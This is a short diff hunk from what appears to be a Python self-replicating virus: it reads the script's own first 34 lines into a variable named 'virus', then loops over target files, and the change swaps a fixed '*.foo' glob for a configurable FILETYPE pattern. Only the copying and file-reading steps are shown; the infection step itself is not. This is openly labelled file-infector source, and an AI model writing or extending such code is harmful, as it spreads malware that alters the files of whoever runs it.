@@ -22,7 +22,7 @@ virus = ''
 for i in range(0, 34):
 	virus += IN.readline()
 
-for myfile in glob.glob('*.foo'):
+for myfile in glob.glob(FILETYPE):
 	IN = open(myfile, 'r')
 	all_of_it = IN.read()
 	IN.close()
